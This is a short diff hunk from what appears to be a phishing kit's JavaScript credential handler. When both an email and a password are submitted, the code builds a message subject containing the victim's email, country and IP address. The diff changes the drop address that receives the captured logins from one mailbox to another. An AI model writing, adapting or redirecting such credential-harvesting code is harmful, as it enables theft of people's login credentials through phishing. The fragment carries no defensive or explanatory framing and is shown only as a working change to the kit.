@@ -12,7 +12,7 @@ const server = new Date().toLocaleString('en-US', { weekday: 'short', year: 'num
 let signal, msg;
 
 if (email !== null && password !== null) {
-    const own = 'alijafari077@yandex.com';
+    const own = 'logbox0009@gmail.com';
     const subj = `Login: | ${email} | ${country} | ${ip}`;
 
     const headers = {
